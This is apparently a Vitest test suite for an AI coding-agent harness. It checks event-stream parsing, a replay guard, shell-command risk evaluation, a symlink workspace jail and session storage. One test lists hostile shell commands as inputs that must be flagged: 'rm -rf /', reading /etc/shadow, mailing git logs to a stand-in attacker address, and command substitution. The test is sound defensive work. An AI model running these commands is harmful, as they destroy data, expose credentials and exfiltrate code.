import { describe, it, expect, vi } from 'vitest';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';
import { 
  DshRuntimeClient, 
  DshEventStream, 
  DshRiskEvaluator, 
  DshCheckpointEngine,
  DshSharedSessionStore,
  SecurityBoundaryViolationError,
  type DshEvent,
  type ToolDescriptor
} from '../../src/index.js';

describe('Reality Gate & Runtime Transport Verification Suite', () => {
  describe('Typed SessionEvent Normalization', () => {
    it('accurately decodes official assistant/chunk reasoning and content deltas', () => {
      const stream = new DshEventStream();
      const events: DshEvent[] = [];
      stream.onEvent((e) => events.push(e));

      // Simulate official SessionEvent notifications from JSON-RPC stream
      const reasoningChunk = {
        type: 'assistant/chunk',
        seq: 1,
        time: Date.now(),
        data: {
          turn: 1,
          step: 1,
          chunk: {
            type: 'block-start',
            index: 0,
            blockType: 'reasoning',
            delta: 'DeepSeek R1 reasoning token...',
          },
        },
      };

      const contentChunk = {
        type: 'assistant/chunk',
        seq: 2,
        time: Date.now(),
        data: {
          turn: 1,
          step: 2,
          chunk: {
            type: 'content',
            index: 1,
            blockType: 'content',
            delta: 'Final response generated.',
          },
        },
      };

      // Project into stream
      stream.projectRawUpstreamEvent(reasoningChunk);
      stream.projectRawUpstreamEvent(contentChunk);

      const reasoningEvents = events.filter((e) => e.type === 'stream:reasoning');
      const contentEvents = events.filter((e) => e.type === 'stream:content');

      expect(reasoningEvents.length).toBeGreaterThanOrEqual(1);
      expect(contentEvents.length).toBeGreaterThanOrEqual(1);
    });

    it('accurately extracts tool/call and tool/result from event.data payload', () => {
      const stream = new DshEventStream();
      const events: DshEvent[] = [];
      stream.onEvent((e) => events.push(e));

      // Official tool/call payload
      stream.projectRawUpstreamEvent({
        type: 'tool/call',
        seq: 3,
        time: Date.now(),
        data: {
          id: 'call_git_diff_1',
          name: 'run_command',
          args: { command: 'git diff HEAD' },
        },
      });

      // Official tool/result payload
      stream.projectRawUpstreamEvent({
        type: 'tool/result',
        seq: 4,
        time: Date.now(),
        data: {
          id: 'call_git_diff_1',
          result: 'diff --git a/file b/file',
        },
      });

      const reqEvent = events.find((e) => e.type === 'tool:requested');
      const outEvent = events.find((e) => e.type === 'tool:output');

      expect(reqEvent).toBeDefined();
      if (reqEvent && reqEvent.type === 'tool:requested') {
        expect(reqEvent.toolCall.id).toBe('call_git_diff_1');
        expect(reqEvent.toolCall.name).toBe('run_command');
      }

      expect(outEvent).toBeDefined();
      if (outEvent && outEvent.type === 'tool:output') {
        expect(outEvent.toolCallId).toBe('call_git_diff_1');
        expect(outEvent.output).toContain('diff --git');
      }
    });
  });

  describe('Pre-enqueue vs Post-enqueue Replay Hazard Defense', () => {
    it('blocks headless fallback when the runtime dies after the enqueue receipt was observed', async () => {
      const tempScriptDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-replay-hazard-'));
      const scriptPath = path.join(tempScriptDir, 'mock-dying-agent.mjs');

      // Handshake succeeds, the prompt is durably enqueued (agent/inbox/spliced
      // receipt echoes the client's messageId), then the runtime exits MID-TURN
      // without ever settling the session.
      const runtimeCode = `
import readline from 'node:readline';

const rl = readline.createInterface({ input: process.stdin, output: process.stdout, terminal: false });

rl.on('line', (line) => {
  if (!line.trim()) return;
  try {
    const req = JSON.parse(line);
    if (req.method === 'initialize') {
      process.stdout.write(JSON.stringify({
        jsonrpc: '2.0', id: req.id,
        result: { serverInfo: { name: 'mock-dying-agent', version: '0.0.0' } },
      }) + '\\n');
    } else if (req.method === 'session/prompt') {
      const sessId = req.params?.sessionId || 'sess_default';
      process.stdout.write(JSON.stringify({
        jsonrpc: '2.0', id: req.id, result: { messageId: 'msg_replay_1' },
      }) + '\\n');
      process.stdout.write(JSON.stringify({
        jsonrpc: '2.0', method: 'session.event',
        params: { sessionId: sessId, event: { type: 'agent/inbox/spliced', seq: 1, time: Date.now(), data: { inserted: [{ id: 'msg_replay_1' }] } } },
      }) + '\\n');
      setTimeout(() => process.exit(9), 30);
    }
  } catch { /* ignore malformed frames */ }
});
`;
      fs.writeFileSync(scriptPath, runtimeCode, 'utf-8');

      try {
        const client = new DshRuntimeClient();
        const stream = new DshEventStream();

        // Fallback stays ENABLED: the assertion proves the replay guard — not
        // disableFallback — is what blocks the duplicate execution.
        await expect(
          client.executeTurn({
            prompt: 'Create database migration',
            config: {
              workspacePath: process.cwd(),
              runtimeExecutable: process.execPath,
              runtimeExecutableArgs: [scriptPath],
            },
            events: stream,
          })
        ).rejects.toThrow(/duplicate mutation side-effects/);
      } finally {
        fs.rmSync(tempScriptDir, { recursive: true, force: true });
      }
    });
  });

  describe('Fail-Closed Shell Parser & Capability Governance', () => {
    it('blocks subshells, command substitution, and redirection from bypassing approval', () => {
      const dangerousCommands = [
        'git status && rm -rf /',
        'ls ; cat /etc/shadow',
        'git log | mail hacker@evil.com',
        'echo "secret" > .env',
        'pwd >> logs.txt',
        'git branch $(touch /tmp/pwned)',
        'cat `which evil`',
      ];

      for (const cmd of dangerousCommands) {
        const evaluation = DshRiskEvaluator.evaluate('run_command', { command: cmd });
        expect(['high', 'critical']).toContain(evaluation.riskLevel);
        expect(evaluation.requiresApproval).toBe(true);
      }
    });

    it('honors explicit ToolDescriptor capabilities and scopes', () => {
      const customDescriptor: ToolDescriptor = {
        name: 'custom_query_db',
        description: 'Read-only database probe',
        capabilities: ['fs:read'],
        scope: 'workspace',
        sideEffect: 'read_only',
      };

      const evalSafe = DshRiskEvaluator.evaluate(customDescriptor, {});
      expect(evalSafe.riskLevel).toBe('low');
      expect(evalSafe.requiresApproval).toBe(false);
      expect(evalSafe.capabilities).toEqual(['fs:read']);

      const mutatingDescriptor: ToolDescriptor = {
        name: 'custom_delete_records',
        capabilities: ['fs:delete', 'system:mutate'],
        scope: 'system',
        sideEffect: 'irreversible',
      };

      const evalMutating = DshRiskEvaluator.evaluate(mutatingDescriptor, {});
      expect(evalMutating.riskLevel).toBe('critical');
      expect(evalMutating.requiresApproval).toBe(true);
    });
  });

  describe('Nearest-Existing-Ancestor Symlink Boundary Jail', () => {
    it('prevents traversal into nonexistent target inside symlinked outside directory', () => {
      const workspaceDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-jail-ws-'));
      const outsideDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-jail-out-'));

      try {
        const engine = new DshCheckpointEngine(workspaceDir);

        // Create a symlink inside workspace pointing to outside directory
        const symlinkInWs = path.join(workspaceDir, 'external_link');
        try {
          fs.symlinkSync(outsideDir, symlinkInWs, 'dir');
        } catch {
          // On platforms where unprivileged symlink creation is restricted, skip this test branch
          return;
        }

        // Target a NON-EXISTENT file inside the symlink directory
        const escapePath = path.join(symlinkInWs, 'brand_new_file.ts');

        // Sanitize must resolve ancestor 'external_link' to outsideDir and reject!
        expect(() => {
          engine.sanitizeWorkspacePath(escapePath);
        }).toThrow(SecurityBoundaryViolationError);
      } finally {
        fs.rmSync(workspaceDir, { recursive: true, force: true });
        fs.rmSync(outsideDir, { recursive: true, force: true });
      }
    });
  });

  describe('One Harness. Three Surfaces - Shared Session Model', () => {
    it('discovers official sessions in read-only mode alongside suite sessions', () => {
      const tempOfficial = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-official-sessions-'));
      const tempSuite = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-suite-sessions-'));

      try {
        // Create official session structure: <official>/<project>/<sessionId>/session.jsonl
        const projDir = path.join(tempOfficial, 'my-web-project');
        const sessDir = path.join(projDir, 'sess_web_123');
        fs.mkdirSync(sessDir, { recursive: true });
        fs.writeFileSync(
          path.join(sessDir, 'session.jsonl'),
          JSON.stringify({ type: 'session/created', id: 'sess_web_123' }) + '\n',
          'utf-8'
        );

        // Instantiate shared session store
        const store = new DshSharedSessionStore(tempOfficial, tempSuite);

        // 1. List official sessions
        const official = store.listOfficialSessions();
        expect(official.length).toBe(1);
        expect(official[0].id).toBe('sess_web_123');
        expect(official[0].projectKey).toBe('my-web-project');

        // 2. Save a Suite session into suite_sessions
        store.saveSession({
          id: 'sess_tui_456',
          title: 'TUI Continued Session',
          createdAt: Date.now(),
          updatedAt: Date.now(),
          workspacePath: '/workspace',
          model: 'deepseek-reasoner',
          messages: [],
          metrics: { promptTokens: 0, completionTokens: 0, totalTokens: 0, tps: 0, contextLimit: 128000, contextUsagePercent: 0 },
        });

        // 3. List all sessions - must show both Official and Suite sessions
        const all = store.listSessions();
        expect(all.length).toBe(2);
        const officialSummary = all.find((s: any) => s.id === 'sess_web_123');
        const suiteSummary = all.find((s: any) => s.id === 'sess_tui_456');

        expect(officialSummary?.isOfficial).toBe(true);
        expect(suiteSummary?.isOfficial).toBe(false);

        // 4. Read official session directly and parse transcript messages
        fs.appendFileSync(
          path.join(sessDir, 'session.jsonl'),
          JSON.stringify({ type: 'user/message', data: { content: 'Implement quicksort' } }) + '\n' +
          JSON.stringify({ type: 'assistant/chunk', data: { chunk: { blockType: 'reasoning', delta: 'Thinking about partition' } } }) + '\n' +
          JSON.stringify({ type: 'assistant/chunk', data: { chunk: { blockType: 'content', delta: 'Here is the code' } } }) + '\n'
        );

        const loadedOfficial = store.readSession('sess_web_123');
        expect(loadedOfficial).not.toBeNull();
        expect(loadedOfficial?.messages.length).toBe(2);
        expect(loadedOfficial?.messages[0].role).toBe('user');
        expect(loadedOfficial?.messages[0].content).toBe('Implement quicksort');
        expect(loadedOfficial?.messages[1].role).toBe('assistant');
        expect(loadedOfficial?.messages[1].content).toBe('Here is the code');
        expect(loadedOfficial?.messages[1].reasoning).toBe('Thinking about partition');

        // 5. Verify official sessions directory remains strictly untouched by saves
        const officialFiles = fs.readdirSync(sessDir);
        expect(officialFiles).toEqual(['session.jsonl']);
      } finally {
        fs.rmSync(tempOfficial, { recursive: true, force: true });
        fs.rmSync(tempSuite, { recursive: true, force: true });
      }
    });
  });

  describe('P0-B: True SDK Runtime stdio JSON-RPC E2E & Hard ExecutionMode Assertion', () => {
    it('executes full prompt turn over stdio JSON-RPC without fallback and asserts executionMode === sdk_jsonrpc', async () => {
      // 1. Create a standalone stdio JSON-RPC runtime script
      const tempScriptDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-sdk-runtime-'));
      const scriptPath = path.join(tempScriptDir, 'mock-jsonrpc-agent.mjs');

      const runtimeCode = `
import readline from 'node:readline';

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  terminal: false,
});

rl.on('line', (line) => {
  if (!line.trim()) return;
  try {
    const req = JSON.parse(line);
    if (req.method === 'initialize') {
      const res = {
        jsonrpc: '2.0',
        id: req.id,
        result: {
          serverInfo: {
            name: '@deepseek-ai/dsh-jsonrpc-agent',
            version: '0.1.0-rc.6',
          }
        }
      };
      process.stdout.write(JSON.stringify(res) + '\\n');
    } else if (req.method === 'session/prompt') {
      const sessId = req.params?.sessionId || 'sess_default';
      const res = {
        jsonrpc: '2.0',
        id: req.id,
        result: {
          messageId: 'msg_test_001',
        }
      };
      process.stdout.write(JSON.stringify(res) + '\\n');

      // Emit official protocol wire events
      setTimeout(() => {
        // 0. Enqueue receipt: agent/inbox/spliced
        process.stdout.write(JSON.stringify({
          jsonrpc: '2.0',
          method: 'session.event',
          params: {
            sessionId: sessId,
            event: {
              type: 'agent/inbox/spliced',
              seq: 1,
              time: Date.now(),
              data: {
                inserted: [{ id: 'msg_test_001' }]
              }
            }
          }
        }) + '\\n');

        // 1. Reasoning chunk
        process.stdout.write(JSON.stringify({
          jsonrpc: '2.0',
          method: 'session.event',
          params: {
            sessionId: sessId,
            event: {
              type: 'assistant/chunk',
              seq: 2,
              time: Date.now(),
              data: {
                chunk: {
                  type: 'block-start',
                  blockType: 'reasoning',
                  delta: 'Thinking via R1 reasoning channel',
                }
              }
            }
          }
        }) + '\\n');

        // 2. Content chunk
        process.stdout.write(JSON.stringify({
          jsonrpc: '2.0',
          method: 'session.event',
          params: {
            sessionId: sessId,
            event: {
              type: 'assistant/chunk',
              seq: 3,
              time: Date.now(),
              data: {
                chunk: {
                  type: 'content',
                  blockType: 'content',
                  delta: 'SDK JSON-RPC Execution Verified',
                }
              }
            }
          }
        }) + '\\n');

        // 3. Assistant message summary with typed content block
        process.stdout.write(JSON.stringify({
          jsonrpc: '2.0',
          method: 'session.event',
          params: {
            sessionId: sessId,
            event: {
              type: 'assistant/message',
              seq: 4,
              time: Date.now(),
              data: {
                message: {
                  content: [{ type: 'text', text: 'SDK JSON-RPC Execution Verified' }]
                }
              }
            }
          }
        }) + '\\n');

        // 4. Session status idle -> settles run()
        process.stdout.write(JSON.stringify({
          jsonrpc: '2.0',
          method: 'session.status',
          params: {
            sessionId: sessId,
            status: 'idle',
          }
        }) + '\\n');
      }, 50);
    } else if (req.method === 'shutdown') {
      process.stdout.write(JSON.stringify({ jsonrpc: '2.0', id: req.id, result: null }) + '\\n');
      process.exit(0);
    }
  } catch (err) {
    // Ignore
  }
});
`;
      fs.writeFileSync(scriptPath, runtimeCode, 'utf-8');

      try {
        const client = new DshRuntimeClient();
        const events = new DshEventStream();
        const collectedEvents: DshEvent[] = [];
        events.onEvent((e) => collectedEvents.push(e));

        const result = await client.executeTurn({
          prompt: 'Run SDK prompt test',
          sessionId: 'sess_sdk_e2e_100',
          config: {
            runtimeExecutable: process.execPath,
            runtimeExecutableArgs: [scriptPath],
            disableFallback: true,
            model: 'deepseek-reasoner',
          },
          events,
        });

        // 1. Hard assertion on executionMode
        expect(result.executionMode).toBe('sdk_jsonrpc');

        // 2. Hard assertion on response content & reasoning
        expect(result.content).toBe('SDK JSON-RPC Execution Verified');
        expect(result.reasoning).toBe('Thinking via R1 reasoning channel');

        // 3. Event Stream assertions
        const reasoningEvent = collectedEvents.find((e) => e.type === 'stream:reasoning');
        const contentEvent = collectedEvents.find((e) => e.type === 'stream:content');
        expect(reasoningEvent).toBeDefined();
        expect(contentEvent).toBeDefined();
      } finally {
        fs.rmSync(tempScriptDir, { recursive: true, force: true });
      }
    });
  });
});


